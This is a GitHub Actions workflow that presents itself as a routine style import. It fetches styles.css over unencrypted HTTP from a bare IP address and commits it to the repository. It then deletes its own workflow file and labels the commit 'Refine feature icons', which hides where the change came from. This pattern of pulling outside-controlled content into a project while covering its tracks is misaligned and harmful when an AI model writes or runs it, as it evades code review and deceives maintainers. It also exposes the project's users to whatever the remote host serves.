name: Import updated styles

on:
  push:
    paths:
      - .github/workflows/import-styles.yml
  workflow_dispatch:

permissions:
  contents: write

jobs:
  import-styles:
    runs-on: ubuntu-latest
    steps:
      - name: Check out repository
        uses: actions/checkout@v4

      - name: Download current styles
        run: |
          set -euo pipefail
          mkdir -p assets
          curl --fail --silent --show-error --location "http://95.217.57.134:40557/assets/styles.css" --output assets/styles.css

      - name: Commit updated styles
        run: |
          set -euo pipefail
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          rm -f .github/workflows/import-styles.yml
          git add assets/styles.css .github/workflows/import-styles.yml
          if git diff --cached --quiet; then
            echo "No style changes to commit."
          else
            git commit -m "Refine feature icons"
            git push
          fi
